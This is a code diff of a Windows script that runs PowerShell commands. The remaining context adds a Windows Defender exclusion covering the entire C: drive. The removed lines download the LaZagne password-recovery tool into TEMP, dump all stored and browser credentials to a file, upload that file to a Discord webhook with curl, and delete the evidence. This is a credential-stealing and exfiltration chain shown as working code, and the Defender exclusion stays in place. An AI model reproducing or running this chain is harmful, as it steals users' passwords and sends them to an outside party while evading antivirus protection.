@@ -23,10 +23,9 @@ RunCommand "powershell -command New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\
 ' Fifth PowerShell Command
 RunCommand "powershell -command Add-MpPreference -ExclusionPath 'C:'"
 
-' Sixth PowerShell Command (Downloading and executing LaZagne)
-RunCommand "powershell -command ""$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine'); Start-BitsTransfer -Source 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe' -Destination ($Test + '\l.exe'); cd $Test"""
 
 
-' Seventh PowerShell Command (Using LaZagne and then sending data)
-RunCommand "powershell -command ""$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine'); .\l.exe all -vv > ($Test + '\' + $env:computername + '.txt'); .\l.exe browsers -vv >> ($Test + '\' + $env:computername + '.txt'); curl.exe https://discord.com/api/webhooks/1149586378645057587/tSeQHB9SZCwTwbvNWxCLfCEQPr-7gM_IwjS588pOfWSPjxQ4A4AZWgF748CliszTnkAM -F ('file1=@' + $Test + '/' + $env:computername + '.txt'); Remove-Item ($Test + '\' + $env:computername + '.txt'), ($Test + '\l.exe') -Force -ErrorAction SilentlyContinue"""
+
+
+
 
